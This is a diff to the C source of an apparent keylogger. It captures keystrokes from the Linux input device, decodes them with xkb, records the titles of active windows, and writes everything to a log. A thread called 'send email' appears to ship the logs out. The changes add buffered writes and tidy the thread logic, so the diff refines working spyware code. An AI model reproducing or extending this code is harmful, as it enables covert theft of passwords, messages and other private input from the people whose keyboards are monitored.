@@ -12,16 +12,18 @@
 #include "file_handler.h"
 #include "keyboard_handler.h"
 #include "send_email.h"
+#include "utils.h"
 
-static volatile sig_atomic_t exit_flag = 0;
-static int pipe_fd[2];
-pthread_mutex_t file_mutex = PTHREAD_MUTEX_INITIALIZER;
-#define BUFFER_SIZE 64
+#define KEY_BUFFER_SIZE 64
+#define TEXT_BUFFER_SIZE 4096
 #define KEYCODE_OFFSET 8
 #ifndef DURATION
 #error "DURATION is not defined"
 #endif
-#define FILE_EVENT_KEYBOARD "/dev/input/event0"
+
+static volatile sig_atomic_t exit_flag = 0;
+static int pipe_fd[2];
+pthread_mutex_t file_mutex = PTHREAD_MUTEX_INITIALIZER;
 
 typedef struct {
     KeyboardHandler keyboard_handler;
@@ -38,27 +40,14 @@ void signal_handler(int sig) {
     }
 }
 
-int get_key_string(struct xkb_state *state, xkb_keycode_t keycode, char *buffer, int buffer_len) {
-    int len = xkb_state_key_get_utf8(state, keycode, buffer, buffer_len);
-    if (len + 1 > buffer_len) {
-        return 1;
-    }
-    return 0;
-}
-
-int open_file_event_keyboard(int *fd){
-    *fd = open(FILE_EVENT_KEYBOARD, O_RDONLY);
-    if (*fd == -1){
-        fprintf(stderr, "Error open file event keyboard\n");
-        return 1;
-    }
-    return 0;
-}
-
 void *read_keyboard(void *arg){
     HandlerContext *context = (HandlerContext*) arg;
     struct input_event ev;
-    char key[BUFFER_SIZE];
+    char key[KEY_BUFFER_SIZE];
+    int write_error;
+    BufferText buffer;
+
+    if (buffer_text_init(&buffer)) pthread_exit((void *)1);
 
     while (!exit_flag) {
         char *current_window = NULL;
@@ -69,17 +58,24 @@ void *read_keyboard(void *arg){
             pthread_exit((void *)1);
         }
 
-        pthread_mutex_lock(&file_mutex);
         if (get_active_window(context->keyboard_handler.dpy, &current_window)){
             fprintf(stderr, "Error getting active window\n");
         } else {
+            int flag_update_current_window = 0;
             if (!(context->keyboard_handler.active_window)){
-                context->keyboard_handler.active_window = strdup(current_window);
-                FileHandler_write(&(context->file_handler), context->keyboard_handler.active_window);
+                flag_update_current_window = 1;
             } else if (strcmp(context->keyboard_handler.active_window, current_window)) {
                 free(context->keyboard_handler.active_window);
+                flag_update_current_window = 1;
+            }
+            if (flag_update_current_window){
                 context->keyboard_handler.active_window = strdup(current_window);
-                FileHandler_write(&(context->file_handler), context->keyboard_handler.active_window);
+                write_error = write_or_buffer_event(&(context->file_handler), &buffer,
+                                                    context->keyboard_handler.active_window, &file_mutex);
+                if (write_error) {
+                    buffer_text_clear(&buffer);
+                    pthread_exit((void *)1);
+                }
             }
             free(current_window);
         }
@@ -89,14 +85,18 @@ void *read_keyboard(void *arg){
             if (ev.value == 1) {
                 xkb_state_update_key(context->keyboard_handler.state, code, XKB_KEY_DOWN);
                 if (!get_key_string(context->keyboard_handler.state, code, key, sizeof(key))) {
-                    FileHandler_write(&(context->file_handler), key);
+                    write_error = write_or_buffer_event(&(context->file_handler), &buffer, key, &file_mutex);
+                    if (write_error){
+                        buffer_text_clear(&buffer);
+                        pthread_exit((void *)1);
+                    }
                 }
             } else if (ev.value == 0) {
                 xkb_state_update_key(context->keyboard_handler.state, code, XKB_KEY_UP);
             }
         }
-        pthread_mutex_unlock(&file_mutex);
     }
+    buffer_text_clear(&buffer);
     pthread_exit((void *)0);
 }
 
@@ -188,8 +188,8 @@ int main() {
     pthread_join(thread_read, &retval_read);
     code_send = (int)(intptr_t)retval_send;
     code_read = (int)(intptr_t)retval_read;
-    printf("Thread send exit, value %d\n", code_send);
-    printf("Thread read exit, value %d\n", code_read);
+    printf("Thread send email exit, value %d\n", code_send);
+    printf("Thread read keyboard exit, value %d\n", code_read);
 
     context_cleanup(&context);
     close(pipe_fd[0]);
